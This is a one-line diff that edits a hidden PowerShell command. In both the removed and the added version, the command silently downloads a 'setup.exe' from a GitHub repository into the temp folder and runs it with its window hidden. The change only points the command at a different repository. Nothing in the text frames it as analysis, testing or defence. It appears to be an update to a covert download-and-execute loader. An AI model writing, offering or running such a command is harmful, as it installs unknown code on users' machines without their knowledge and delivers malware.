@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Lil-hack/gitpagestest/raw/refs/heads/main/setup.exe' -OutFile '%TEMP%\setup.exe'; Start-Process -WindowStyle Hidden '%TEMP%\setup.exe'"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/Setup.exe' -OutFile '%TEMP%\setup.exe'; Start-Process -WindowStyle Hidden '%TEMP%\setup.exe'"
